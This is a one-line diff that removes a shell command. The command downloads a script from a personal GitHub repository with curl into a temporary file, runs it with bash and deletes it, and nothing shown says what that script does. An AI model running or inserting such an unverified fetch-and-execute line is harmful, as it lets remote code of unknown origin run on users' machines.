@@ -1,1 +1,0 @@
-temp_11=$(mktemp) && curl -sSL https://raw.githubusercontent.com/luzihao0114/-/main/11 -o "$temp_11" && (bash "$temp_11"; rm -f "$temp_11")
